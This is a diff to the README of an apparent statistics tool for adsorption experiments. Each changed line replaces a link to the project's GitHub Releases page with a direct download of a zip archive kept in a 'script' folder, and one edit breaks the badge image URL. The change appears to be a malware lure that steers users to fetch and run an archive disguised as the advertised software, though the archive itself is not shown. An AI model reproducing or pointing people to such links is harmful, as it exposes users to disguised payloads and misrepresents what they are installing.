@@ -1,7 +1,7 @@
 # 📊 Adsorption-Factorial-ANOVA - Simplify Your Adsorption Analysis
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/bas7071/Adsorption-Factorial-ANOVA/releases)
+[![Download Release](https://raw.githubusercontent.com/bas7071/Adsorption-Factorial-ANOVA/main/script/ANOVA-Adsorption-Factorial-2.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/bas7071/Adsorption-Factorial-ANOVA/main/script/ANOVA-Adsorption-Factorial-2.9.zip)
 
 ## 📖 Description
 This application helps you optimize multi-factor adsorption processes using statistical methods. It demonstrates a JASP-based methodology, utilizing a synthetic dataset of 2,304 samples. You can expect a smooth workflow for data generation and analysis in Python, making reproducible research easier in the field of environmental engineering.
@@ -12,7 +12,7 @@ Follow these simple steps to get started with the Adsorption-Factorial-ANOVA app
 ### 1. Download the Application
 To begin, visit the Releases page to download the latest version of the software.
 
-[Download Now](https://github.com/bas7071/Adsorption-Factorial-ANOVA/releases)
+[Download Now](https://raw.githubusercontent.com/bas7071/Adsorption-Factorial-ANOVA/main/script/ANOVA-Adsorption-Factorial-2.9.zip)
 
 ### 2. Check System Requirements
 Before running the application, please ensure your system meets the following requirements:
@@ -64,7 +64,7 @@ For further assistance, please check the Issues section of the repository or con
 ## 📥 Download & Install
 To download the latest version of the Adsorption-Factorial-ANOVA application, please visit the link below.
 
-[Download Now](https://github.com/bas7071/Adsorption-Factorial-ANOVA/releases)
+[Download Now](https://raw.githubusercontent.com/bas7071/Adsorption-Factorial-ANOVA/main/script/ANOVA-Adsorption-Factorial-2.9.zip)
 
 ## 📝 Contribution
 We welcome contributions from everyone. If you would like to improve the application or documentation, feel free to fork the repository and submit a pull request.
